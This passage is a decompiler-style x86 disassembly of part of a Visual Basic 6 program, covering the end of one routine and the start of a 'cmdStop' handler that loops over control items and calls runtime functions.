008CD6EF: push eax
008CD6F0: lea eax, var_40
008CD6F3: push eax
008CD6F4: push 00000002h
008CD6F6: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CD6FB: add esp, 0000000Ch
008CD6FE: lea ecx, var_58
008CD701: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CD706: cmp word ptr [008F2430h], FFFFh
008CD70E: jnz 008CDB4Dh
008CD714: mov var_00000094, 00000001h
008CD71E: mov var_0000009C, 00000002h
008CD728: cmp [008F2010h], 00000000h
008CD72F: jnz 8CD74Ch
008CD731: push 008F2010h
008CD736: push 00433984h
008CD73B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CD740: mov var_0000011C, 008F2010h
008CD74A: jmp 8CD756h
008CD74C: mov var_0000011C, 008F2010h
008CD756: push 00000000h
008CD758: push 00000001h
008CD75A: push 00440E48h
008CD75F: push 00000000h
008CD761: push 00000018h
008CD763: mov eax, var_0000011C
008CD769: mov eax, [eax]
008CD76B: mov ecx, var_0000011C
008CD771: mov ecx, [ecx]
008CD773: mov ecx, [ecx]
008CD775: push eax
008CD776: call [ecx+0000054Ch]
008CD77C: push eax
008CD77D: lea eax, var_40
008CD780: push eax
008CD781: call 00410A84h ; Set (object)
008CD786: push eax
008CD787: lea eax, var_58
008CD78A: push eax
008CD78B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CD790: add esp, 00000010h
008CD793: push eax
008CD794: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CD799: push eax
008CD79A: lea eax, var_44
008CD79D: push eax
008CD79E: call 00410A84h ; Set (object)
008CD7A3: push eax
008CD7A4: lea eax, var_68
008CD7A7: push eax
008CD7A8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CD7AD: add esp, 00000010h
008CD7B0: push eax
008CD7B1: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008CD7B6: mov var_000000A4, eax
008CD7BC: mov var_000000AC, 00000003h
008CD7C6: mov var_000000B4, 00000001h
008CD7D0: mov var_000000BC, 00000002h
008CD7DA: lea eax, var_0000009C
008CD7E0: push eax
008CD7E1: lea eax, var_000000AC
008CD7E7: push eax
008CD7E8: lea eax, var_000000BC
008CD7EE: push eax
008CD7EF: lea eax, var_000000E8
008CD7F5: push eax
008CD7F6: lea eax, var_000000D8
008CD7FC: push eax
008CD7FD: lea eax, var_24
008CD800: push eax
008CD801: call 00410A3Ch ; For
008CD806: mov var_00000114, eax
008CD80C: lea eax, var_44
008CD80F: push eax
008CD810: lea eax, var_40
008CD813: push eax
008CD814: push 00000002h
008CD816: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CD81B: add esp, 0000000Ch
008CD81E: lea eax, var_68
008CD821: push eax
008CD822: lea eax, var_58
008CD825: push eax
008CD826: push 00000002h
008CD828: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CD82D: add esp, 0000000Ch
008CD830: jmp 008CDB3Bh
008CD835: lea eax, var_24
008CD838: mov var_00000094, eax
008CD83E: mov var_0000009C, 0000400Ch
008CD848: cmp [008F2010h], 00000000h
008CD84F: jnz 8CD86Ch
008CD851: push 008F2010h
008CD856: push 00433984h
008CD85B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CD860: mov var_00000120, 008F2010h
008CD86A: jmp 8CD876h
008CD86C: mov var_00000120, 008F2010h
008CD876: push 00000000h
008CD878: push 00000004h
008CD87A: push 00440E58h
008CD87F: push 00000010h
008CD881: pop eax
008CD882: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CD887: lea esi, var_0000009C
008CD88D: mov edi, esp
008CD88F: movsd 
008CD890: movsd 
008CD891: movsd 
008CD892: movsd 
008CD893: push 00000001h
008CD895: push 00000000h
008CD897: push 00440E48h
008CD89C: push 00000000h
008CD89E: push 00000018h
008CD8A0: mov eax, var_00000120
008CD8A6: mov eax, [eax]
008CD8A8: mov ecx, var_00000120
008CD8AE: mov ecx, [ecx]
008CD8B0: mov ecx, [ecx]
008CD8B2: push eax
008CD8B3: call [ecx+0000054Ch]
008CD8B9: push eax
008CD8BA: lea eax, var_40
008CD8BD: push eax
008CD8BE: call 00410A84h ; Set (object)
008CD8C3: push eax
008CD8C4: lea eax, var_58
008CD8C7: push eax
008CD8C8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CD8CD: add esp, 00000010h
008CD8D0: push eax
008CD8D1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CD8D6: push eax
008CD8D7: lea eax, var_44
008CD8DA: push eax
008CD8DB: call 00410A84h ; Set (object)
008CD8E0: push eax
008CD8E1: lea eax, var_68
008CD8E4: push eax
008CD8E5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CD8EA: add esp, 00000020h
008CD8ED: push eax
008CD8EE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CD8F3: push eax
008CD8F4: lea eax, var_48
008CD8F7: push eax
008CD8F8: call 00410A84h ; Set (object)
008CD8FD: push eax
008CD8FE: lea eax, var_78
008CD901: push eax
008CD902: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CD907: add esp, 00000010h
008CD90A: push eax
008CD90B: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008CD910: sub ax, FFFFh
008CD914: neg ax
008CD917: sbb eax, eax
008CD919: inc eax
008CD91A: neg eax
008CD91C: mov var_000000C8, ax
008CD923: lea eax, var_48
008CD926: push eax
008CD927: lea eax, var_44
008CD92A: push eax
008CD92B: lea eax, var_40
008CD92E: push eax
008CD92F: push 00000003h
008CD931: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CD936: add esp, 00000010h
008CD939: lea eax, var_78
008CD93C: push eax
008CD93D: lea eax, var_68
008CD940: push eax
008CD941: lea eax, var_58
008CD944: push eax
008CD945: push 00000003h
008CD947: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CD94C: add esp, 00000010h
008CD94F: movsx eax, word ptr var_000000C8
008CD956: test eax, eax
008CD958: jz 008CDB1Eh
008CD95E: lea eax, var_24
008CD961: mov var_00000094, eax
008CD967: mov var_0000009C, 0000400Ch
008CD971: cmp [008F2010h], 00000000h
008CD978: jnz 8CD995h
008CD97A: push 008F2010h
008CD97F: push 00433984h
008CD984: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CD989: mov var_00000124, 008F2010h
008CD993: jmp 8CD99Fh
008CD995: mov var_00000124, 008F2010h
008CD99F: push 00000000h
008CD9A1: push 00000014h
008CD9A3: push 00440E58h
008CD9A8: push 00000010h
008CD9AA: pop eax
008CD9AB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CD9B0: lea esi, var_0000009C
008CD9B6: mov edi, esp
008CD9B8: movsd 
008CD9B9: movsd 
008CD9BA: movsd 
008CD9BB: movsd 
008CD9BC: push 00000001h
008CD9BE: push 00000000h
008CD9C0: push 00440E48h
008CD9C5: push 00000000h
008CD9C7: push 00000018h
008CD9C9: mov eax, var_00000124
008CD9CF: mov eax, [eax]
008CD9D1: mov ecx, var_00000124
008CD9D7: mov ecx, [ecx]
008CD9D9: mov ecx, [ecx]
008CD9DB: push eax
008CD9DC: call [ecx+0000054Ch]
008CD9E2: push eax
008CD9E3: lea eax, var_40
008CD9E6: push eax
008CD9E7: call 00410A84h ; Set (object)
008CD9EC: push eax
008CD9ED: lea eax, var_58
008CD9F0: push eax
008CD9F1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CD9F6: add esp, 00000010h
008CD9F9: push eax
008CD9FA: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CD9FF: push eax
008CDA00: lea eax, var_44
008CDA03: push eax
008CDA04: call 00410A84h ; Set (object)
008CDA09: push eax
008CDA0A: lea eax, var_68
008CDA0D: push eax
008CDA0E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDA13: add esp, 00000020h
008CDA16: push eax
008CDA17: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CDA1C: push eax
008CDA1D: lea eax, var_48
008CDA20: push eax
008CDA21: call 00410A84h ; Set (object)
008CDA26: push eax
008CDA27: lea eax, var_78
008CDA2A: push eax
008CDA2B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDA30: add esp, 00000010h
008CDA33: push eax
008CDA34: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CDA39: mov edx, eax
008CDA3B: lea ecx, var_38
008CDA3E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CDA43: push eax
008CDA44: call 004109DCh ; Val(arg_1)
008CDA49: fstp real8 ptr var_000000C4
008CDA4F: push 00000000h
008CDA51: push 00000000h
008CDA53: push 00000001h
008CDA55: push 00000000h
008CDA57: lea eax, var_0000008C
008CDA5D: push eax
008CDA5E: push 00000010h
008CDA60: push 00000880h
008CDA65: call 00410946h ; ReDim
008CDA6A: add esp, 0000001Ch
008CDA6D: mov eax, [ebp+08h]
008CDA70: mov eax, [eax]
008CDA72: push [ebp+08h]
008CDA75: call [eax+00000300h]
008CDA7B: mov var_80, eax
008CDA7E: mov var_00000088, 00000009h
008CDA88: lea esi, var_00000088
008CDA8E: push 00000000h
008CDA90: push var_0000008C
008CDA96: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008CDA9B: mov ecx, eax
008CDA9D: mov edx, esi
008CDA9F: call 00410940h ; msvbvm60.dll.__vbaVarZero
008CDAA4: mov edx, 0043DA20h ; x121
008CDAA9: lea ecx, var_3C
008CDAAC: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008CDAB1: lea eax, var_0000008C
008CDAB7: push eax
008CDAB8: lea eax, var_3C
008CDABB: push eax
008CDABC: fld real8 ptr var_000000C4
008CDAC2: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008CDAC7: push eax
008CDAC8: call 007A6910h
008CDACD: lea eax, var_0000008C
008CDAD3: push eax
008CDAD4: push 00000000h
008CDAD6: call 00410934h ; Erase
008CDADB: lea eax, var_3C
008CDADE: push eax
008CDADF: lea eax, var_38
008CDAE2: push eax
008CDAE3: push 00000002h
008CDAE5: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008CDAEA: add esp, 0000000Ch
008CDAED: lea eax, var_48
008CDAF0: push eax
008CDAF1: lea eax, var_44
008CDAF4: push eax
008CDAF5: lea eax, var_40
008CDAF8: push eax
008CDAF9: push 00000003h
008CDAFB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CDB00: add esp, 00000010h
008CDB03: lea eax, var_78
008CDB06: push eax
008CDB07: lea eax, var_68
008CDB0A: push eax
008CDB0B: lea eax, var_58
008CDB0E: push eax
008CDB0F: push 00000003h
008CDB11: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CDB16: add esp, 00000010h
008CDB19: call 0041096Ah ; DoEvents
008CDB1E: lea eax, var_000000E8
008CDB24: push eax
008CDB25: lea eax, var_000000D8
008CDB2B: push eax
008CDB2C: lea eax, var_24
008CDB2F: push eax
008CDB30: call 00410A36h ; Next
008CDB35: mov var_00000114, eax
008CDB3B: cmp var_00000114, 00000000h
008CDB42: jnz 008CD835h
008CDB48: jmp 008CDF81h
008CDB4D: mov var_00000094, 00000001h
008CDB57: mov var_0000009C, 00000002h
008CDB61: cmp [008F2010h], 00000000h
008CDB68: jnz 8CDB85h
008CDB6A: push 008F2010h
008CDB6F: push 00433984h
008CDB74: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CDB79: mov var_00000128, 008F2010h
008CDB83: jmp 8CDB8Fh
008CDB85: mov var_00000128, 008F2010h
008CDB8F: push 00000000h
008CDB91: push 00000001h
008CDB93: push 00440E48h
008CDB98: push 00000000h
008CDB9A: push 00000018h
008CDB9C: mov eax, var_00000128
008CDBA2: mov eax, [eax]
008CDBA4: mov ecx, var_00000128
008CDBAA: mov ecx, [ecx]
008CDBAC: mov ecx, [ecx]
008CDBAE: push eax
008CDBAF: call [ecx+00000550h]
008CDBB5: push eax
008CDBB6: lea eax, var_40
008CDBB9: push eax
008CDBBA: call 00410A84h ; Set (object)
008CDBBF: push eax
008CDBC0: lea eax, var_58
008CDBC3: push eax
008CDBC4: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDBC9: add esp, 00000010h
008CDBCC: push eax
008CDBCD: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CDBD2: push eax
008CDBD3: lea eax, var_44
008CDBD6: push eax
008CDBD7: call 00410A84h ; Set (object)
008CDBDC: push eax
008CDBDD: lea eax, var_68
008CDBE0: push eax
008CDBE1: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDBE6: add esp, 00000010h
008CDBE9: push eax
008CDBEA: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008CDBEF: mov var_000000A4, eax
008CDBF5: mov var_000000AC, 00000003h
008CDBFF: mov var_000000B4, 00000001h
008CDC09: mov var_000000BC, 00000002h
008CDC13: lea eax, var_0000009C
008CDC19: push eax
008CDC1A: lea eax, var_000000AC
008CDC20: push eax
008CDC21: lea eax, var_000000BC
008CDC27: push eax
008CDC28: lea eax, var_00000108
008CDC2E: push eax
008CDC2F: lea eax, var_000000F8
008CDC35: push eax
008CDC36: lea eax, var_24
008CDC39: push eax
008CDC3A: call 00410A3Ch ; For
008CDC3F: mov var_00000118, eax
008CDC45: lea eax, var_44
008CDC48: push eax
008CDC49: lea eax, var_40
008CDC4C: push eax
008CDC4D: push 00000002h
008CDC4F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CDC54: add esp, 0000000Ch
008CDC57: lea eax, var_68
008CDC5A: push eax
008CDC5B: lea eax, var_58
008CDC5E: push eax
008CDC5F: push 00000002h
008CDC61: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CDC66: add esp, 0000000Ch
008CDC69: jmp 008CDF74h
008CDC6E: lea eax, var_24
008CDC71: mov var_00000094, eax
008CDC77: mov var_0000009C, 0000400Ch
008CDC81: cmp [008F2010h], 00000000h
008CDC88: jnz 8CDCA5h
008CDC8A: push 008F2010h
008CDC8F: push 00433984h
008CDC94: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CDC99: mov var_0000012C, 008F2010h
008CDCA3: jmp 8CDCAFh
008CDCA5: mov var_0000012C, 008F2010h
008CDCAF: push 00000000h
008CDCB1: push 00000004h
008CDCB3: push 00440E58h
008CDCB8: push 00000010h
008CDCBA: pop eax
008CDCBB: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CDCC0: lea esi, var_0000009C
008CDCC6: mov edi, esp
008CDCC8: movsd 
008CDCC9: movsd 
008CDCCA: movsd 
008CDCCB: movsd 
008CDCCC: push 00000001h
008CDCCE: push 00000000h
008CDCD0: push 00440E48h
008CDCD5: push 00000000h
008CDCD7: push 00000018h
008CDCD9: mov eax, var_0000012C
008CDCDF: mov eax, [eax]
008CDCE1: mov ecx, var_0000012C
008CDCE7: mov ecx, [ecx]
008CDCE9: mov ecx, [ecx]
008CDCEB: push eax
008CDCEC: call [ecx+00000550h]
008CDCF2: push eax
008CDCF3: lea eax, var_40
008CDCF6: push eax
008CDCF7: call 00410A84h ; Set (object)
008CDCFC: push eax
008CDCFD: lea eax, var_58
008CDD00: push eax
008CDD01: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDD06: add esp, 00000010h
008CDD09: push eax
008CDD0A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CDD0F: push eax
008CDD10: lea eax, var_44
008CDD13: push eax
008CDD14: call 00410A84h ; Set (object)
008CDD19: push eax
008CDD1A: lea eax, var_68
008CDD1D: push eax
008CDD1E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDD23: add esp, 00000020h
008CDD26: push eax
008CDD27: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CDD2C: push eax
008CDD2D: lea eax, var_48
008CDD30: push eax
008CDD31: call 00410A84h ; Set (object)
008CDD36: push eax
008CDD37: lea eax, var_78
008CDD3A: push eax
008CDD3B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDD40: add esp, 00000010h
008CDD43: push eax
008CDD44: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008CDD49: sub ax, FFFFh
008CDD4D: neg ax
008CDD50: sbb eax, eax
008CDD52: inc eax
008CDD53: neg eax
008CDD55: mov var_000000C8, ax
008CDD5C: lea eax, var_48
008CDD5F: push eax
008CDD60: lea eax, var_44
008CDD63: push eax
008CDD64: lea eax, var_40
008CDD67: push eax
008CDD68: push 00000003h
008CDD6A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CDD6F: add esp, 00000010h
008CDD72: lea eax, var_78
008CDD75: push eax
008CDD76: lea eax, var_68
008CDD79: push eax
008CDD7A: lea eax, var_58
008CDD7D: push eax
008CDD7E: push 00000003h
008CDD80: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CDD85: add esp, 00000010h
008CDD88: movsx eax, word ptr var_000000C8
008CDD8F: test eax, eax
008CDD91: jz 008CDF57h
008CDD97: lea eax, var_24
008CDD9A: mov var_00000094, eax
008CDDA0: mov var_0000009C, 0000400Ch
008CDDAA: cmp [008F2010h], 00000000h
008CDDB1: jnz 8CDDCEh
008CDDB3: push 008F2010h
008CDDB8: push 00433984h
008CDDBD: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CDDC2: mov var_00000130, 008F2010h
008CDDCC: jmp 8CDDD8h
008CDDCE: mov var_00000130, 008F2010h
008CDDD8: push 00000000h
008CDDDA: push 00000014h
008CDDDC: push 00440E58h
008CDDE1: push 00000010h
008CDDE3: pop eax
008CDDE4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CDDE9: lea esi, var_0000009C
008CDDEF: mov edi, esp
008CDDF1: movsd 
008CDDF2: movsd 
008CDDF3: movsd 
008CDDF4: movsd 
008CDDF5: push 00000001h
008CDDF7: push 00000000h
008CDDF9: push 00440E48h
008CDDFE: push 00000000h
008CDE00: push 00000018h
008CDE02: mov eax, var_00000130
008CDE08: mov eax, [eax]
008CDE0A: mov ecx, var_00000130
008CDE10: mov ecx, [ecx]
008CDE12: mov ecx, [ecx]
008CDE14: push eax
008CDE15: call [ecx+00000550h]
008CDE1B: push eax
008CDE1C: lea eax, var_40
008CDE1F: push eax
008CDE20: call 00410A84h ; Set (object)
008CDE25: push eax
008CDE26: lea eax, var_58
008CDE29: push eax
008CDE2A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDE2F: add esp, 00000010h
008CDE32: push eax
008CDE33: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CDE38: push eax
008CDE39: lea eax, var_44
008CDE3C: push eax
008CDE3D: call 00410A84h ; Set (object)
008CDE42: push eax
008CDE43: lea eax, var_68
008CDE46: push eax
008CDE47: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDE4C: add esp, 00000020h
008CDE4F: push eax
008CDE50: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CDE55: push eax
008CDE56: lea eax, var_48
008CDE59: push eax
008CDE5A: call 00410A84h ; Set (object)
008CDE5F: push eax
008CDE60: lea eax, var_78
008CDE63: push eax
008CDE64: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CDE69: add esp, 00000010h
008CDE6C: push eax
008CDE6D: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008CDE72: mov edx, eax
008CDE74: lea ecx, var_38
008CDE77: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008CDE7C: push eax
008CDE7D: call 004109DCh ; Val(arg_1)
008CDE82: fstp real8 ptr var_000000C4
008CDE88: push 00000000h
008CDE8A: push 00000000h
008CDE8C: push 00000001h
008CDE8E: push 00000000h
008CDE90: lea eax, var_0000008C
008CDE96: push eax
008CDE97: push 00000010h
008CDE99: push 00000880h
008CDE9E: call 00410946h ; ReDim
008CDEA3: add esp, 0000001Ch
008CDEA6: mov eax, [ebp+08h]
008CDEA9: mov eax, [eax]
008CDEAB: push [ebp+08h]
008CDEAE: call [eax+00000300h]
008CDEB4: mov var_80, eax
008CDEB7: mov var_00000088, 00000009h
008CDEC1: lea esi, var_00000088
008CDEC7: push 00000000h
008CDEC9: push var_0000008C
008CDECF: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008CDED4: mov ecx, eax
008CDED6: mov edx, esi
008CDED8: call 00410940h ; msvbvm60.dll.__vbaVarZero
008CDEDD: mov edx, 0043DA20h ; x121
008CDEE2: lea ecx, var_3C
008CDEE5: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008CDEEA: lea eax, var_0000008C
008CDEF0: push eax
008CDEF1: lea eax, var_3C
008CDEF4: push eax
008CDEF5: fld real8 ptr var_000000C4
008CDEFB: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008CDF00: push eax
008CDF01: call 007A6910h
008CDF06: lea eax, var_0000008C
008CDF0C: push eax
008CDF0D: push 00000000h
008CDF0F: call 00410934h ; Erase
008CDF14: lea eax, var_3C
008CDF17: push eax
008CDF18: lea eax, var_38
008CDF1B: push eax
008CDF1C: push 00000002h
008CDF1E: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008CDF23: add esp, 0000000Ch
008CDF26: lea eax, var_48
008CDF29: push eax
008CDF2A: lea eax, var_44
008CDF2D: push eax
008CDF2E: lea eax, var_40
008CDF31: push eax
008CDF32: push 00000003h
008CDF34: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CDF39: add esp, 00000010h
008CDF3C: lea eax, var_78
008CDF3F: push eax
008CDF40: lea eax, var_68
008CDF43: push eax
008CDF44: lea eax, var_58
008CDF47: push eax
008CDF48: push 00000003h
008CDF4A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CDF4F: add esp, 00000010h
008CDF52: call 0041096Ah ; DoEvents
008CDF57: lea eax, var_00000108
008CDF5D: push eax
008CDF5E: lea eax, var_000000F8
008CDF64: push eax
008CDF65: lea eax, var_24
008CDF68: push eax
008CDF69: call 00410A36h ; Next
008CDF6E: mov var_00000118, eax
008CDF74: cmp var_00000118, 00000000h
008CDF7B: jnz 008CDC6Eh
008CDF81: mov var_04, 00000000h
008CDF88: wait 
008CDF89: push 008CE01Bh
008CDF8E: jmp 8CDFE4h
008CDF90: lea eax, var_3C
008CDF93: push eax
008CDF94: lea eax, var_38
008CDF97: push eax
008CDF98: push 00000002h
008CDF9A: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008CDF9F: add esp, 0000000Ch
008CDFA2: lea eax, var_48
008CDFA5: push eax
008CDFA6: lea eax, var_44
008CDFA9: push eax
008CDFAA: lea eax, var_40
008CDFAD: push eax
008CDFAE: push 00000003h
008CDFB0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CDFB5: add esp, 00000010h
008CDFB8: lea eax, var_00000088
008CDFBE: push eax
008CDFBF: lea eax, var_78
008CDFC2: push eax
008CDFC3: lea eax, var_68
008CDFC6: push eax
008CDFC7: lea eax, var_58
008CDFCA: push eax
008CDFCB: push 00000004h
008CDFCD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CDFD2: add esp, 00000014h
008CDFD5: lea eax, var_0000008C
008CDFDB: push eax
008CDFDC: push 00000000h
008CDFDE: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
008CDFE3: ret 
End Sub

Private sub cmdStop__8CE03A
008CE03A: push ebp
008CE03B: mov ebp, esp
008CE03D: sub esp, 0000000Ch
008CE040: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008CE045: mov eax, fs:[00h]
008CE04B: push eax
008CE04C: mov fs:[00000000h], esp
008CE053: mov eax, 000000B8h
008CE058: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE05D: push ebx
008CE05E: push esi
008CE05F: push edi
008CE060: mov var_0C, esp
008CE063: mov var_08, 0040F928h
008CE06A: mov eax, [ebp+08h]
008CE06D: and eax, 00000001h
008CE070: mov var_04, eax
008CE073: mov eax, [ebp+08h]
008CE076: and al, FEh
008CE078: mov [ebp+08h], eax
008CE07B: mov eax, [ebp+08h]
008CE07E: mov eax, [eax]
008CE080: push [ebp+08h]
008CE083: call [eax+04h]
008CE086: cmp word ptr [008F2430h], FFFFh
008CE08E: jnz 008CE44Eh
008CE094: cmp [008F2010h], 00000000h
008CE09B: jnz 8CE0B8h
008CE09D: push 008F2010h
008CE0A2: push 00433984h
008CE0A7: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CE0AC: mov var_000000B8, 008F2010h
008CE0B6: jmp 8CE0C2h
008CE0B8: mov var_000000B8, 008F2010h
008CE0C2: push 00000000h
008CE0C4: push 00000001h
008CE0C6: push 00440E48h
008CE0CB: push 00000000h
008CE0CD: push 00000018h
008CE0CF: mov eax, var_000000B8
008CE0D5: mov eax, [eax]
008CE0D7: mov ecx, var_000000B8
008CE0DD: mov ecx, [ecx]
008CE0DF: mov ecx, [ecx]
008CE0E1: push eax
008CE0E2: call [ecx+0000054Ch]
008CE0E8: push eax
008CE0E9: lea eax, var_24
008CE0EC: push eax
008CE0ED: call 00410A84h ; Set (object)
008CE0F2: push eax
008CE0F3: lea eax, var_3C
008CE0F6: push eax
008CE0F7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE0FC: add esp, 00000010h
008CE0FF: push eax
008CE100: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE105: push eax
008CE106: lea eax, var_28
008CE109: push eax
008CE10A: call 00410A84h ; Set (object)
008CE10F: push eax
008CE110: lea eax, var_4C
008CE113: push eax
008CE114: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE119: add esp, 00000010h
008CE11C: push eax
008CE11D: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008CE122: mov var_000000A4, eax
008CE128: mov var_000000A0, 00000001h
008CE132: mov var_18, 00000001h
008CE139: lea eax, var_28
008CE13C: push eax
008CE13D: lea eax, var_24
008CE140: push eax
008CE141: push 00000002h
008CE143: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CE148: add esp, 0000000Ch
008CE14B: lea eax, var_4C
008CE14E: push eax
008CE14F: lea eax, var_3C
008CE152: push eax
008CE153: push 00000002h
008CE155: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CE15A: add esp, 0000000Ch
008CE15D: jmp 8CE171h
008CE15F: mov eax, var_18
008CE162: add eax, var_000000A0
008CE168: jo 008CE87Ch
008CE16E: mov var_18, eax
008CE171: mov eax, var_18
008CE174: cmp eax, var_000000A4
008CE17A: jnle 008CE449h
008CE180: mov eax, var_18
008CE183: mov var_68, eax
008CE186: mov var_70, 00000003h
008CE18D: cmp [008F2010h], 00000000h
008CE194: jnz 8CE1B1h
008CE196: push 008F2010h
008CE19B: push 00433984h
008CE1A0: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008CE1A5: mov var_000000BC, 008F2010h
008CE1AF: jmp 8CE1BBh
008CE1B1: mov var_000000BC, 008F2010h
008CE1BB: push 00000000h
008CE1BD: push 00000004h
008CE1BF: push 00440E58h
008CE1C4: push 00000010h
008CE1C6: pop eax
008CE1C7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE1CC: lea esi, var_70
008CE1CF: mov edi, esp
008CE1D1: movsd 
008CE1D2: movsd 
008CE1D3: movsd 
008CE1D4: movsd 
008CE1D5: push 00000001h
008CE1D7: push 00000000h
008CE1D9: push 00440E48h
008CE1DE: push 00000000h
008CE1E0: push 00000018h
008CE1E2: mov eax, var_000000BC
008CE1E8: mov eax, [eax]
008CE1EA: mov ecx, var_000000BC
008CE1F0: mov ecx, [ecx]
008CE1F2: mov ecx, [ecx]
008CE1F4: push eax
008CE1F5: call [ecx+0000054Ch]
008CE1FB: push eax
008CE1FC: lea eax, var_24
008CE1FF: push eax
008CE200: call 00410A84h ; Set (object)
008CE205: push eax
008CE206: lea eax, var_3C
008CE209: push eax
008CE20A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE20F: add esp, 00000010h
008CE212: push eax
008CE213: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE218: push eax
008CE219: lea eax, var_28
008CE21C: push eax
008CE21D: call 00410A84h ; Set (object)
008CE222: push eax
008CE223: lea eax, var_4C
008CE226: push eax
008CE227: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE22C: add esp, 00000020h
008CE22F: push eax
008CE230: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE235: push eax
008CE236: lea eax, var_2C
008CE239: push eax
008CE23A: call 00410A84h ; Set (object)
008CE23F: push eax
008CE240: lea eax, var_5C
008CE243: push eax
008CE244: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE249: add esp, 00000010h
008CE24C: push eax
008CE24D: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008CE252: sub ax, FFFFh
008CE256: neg ax
008CE259: sbb eax, eax
008CE25B: inc eax
008CE25C: neg eax
008CE25E: mov var_0000009C, ax
008CE265: lea eax, var_2C
008CE268: push eax
008CE269: lea eax, var_28
008CE26C: push eax
008CE26D: lea eax, var_24
008CE270: push eax
008CE271: push 00000003h
008CE273: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CE278: add esp, 00000010h
008CE27B: lea eax, var_5C
008CE27E: push eax
008CE27F: lea eax, var_4C
008CE282: push eax
008CE283: lea eax, var_3C
008CE286: push eax
008CE287: push 00000003h
008CE289: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CE28E: add esp, 00000010h
008CE291: movsx eax, word ptr var_0000009C
008CE298: test eax, eax
